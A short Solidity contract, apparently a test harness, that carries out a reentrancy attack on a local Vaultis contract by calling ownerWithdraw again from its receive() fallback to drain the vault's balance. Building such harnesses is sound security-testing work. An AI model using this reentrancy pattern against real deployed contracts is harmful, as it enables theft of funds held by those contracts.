// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import {Vaultis} from "./Vaultis.sol";

contract ReentrancyAttack {
    Vaultis public vaultis;
    address public owner;

    constructor(address _vaultisAddress) {
        vaultis = Vaultis(_vaultisAddress);
        owner = msg.sender;
    }

    function attack() public payable {
        vaultis.ownerWithdraw(msg.value);
    }

    receive() external payable {
        if (address(vaultis).balance >= msg.value) {
            vaultis.ownerWithdraw(msg.value);
        }
    }
}
